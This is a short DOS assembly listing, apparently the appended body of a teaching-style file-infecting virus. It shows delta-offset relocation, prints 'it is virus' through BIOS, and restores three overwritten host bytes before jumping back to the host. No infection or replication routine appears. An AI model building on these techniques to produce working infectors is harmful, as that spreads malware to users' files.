org 100h
call	base
base:
pop	bp
sub	bp,base
push	bp ;bp为重定位的相对偏移
call	Display
pop	bp

mov 	ax,OverridedCode
add	ax,bp
mov	si,ax	;设置复制源地址
mov	di,$$
mov	bx,di
mov	cx,3
movestart:	;复制前三字节
mov	al,[si]
mov	[di],al
inc	si
inc	di
dec	cx
jnz	movestart

jmp	bx



Display:
        mov ax, bp
        add ax, Msg	
	mov	bp, ax			; ES:BP = str address
	mov	cx, 0bh			; CX = str len
	mov	ax, 1300h		; AH = 13,  AL = 01h
	mov	bx, 000ch		; page 0(BH = 0) black background red word (BL = 0Ch,highlight)
	mov	dl, 6
	mov dh, 3
	int	10h			; 
	ret

Msg: db "it is virus\n"
OverridedCode: db "000" ;3byte used save overrided bytes in infected code
InfectedFileSize dw 0x0000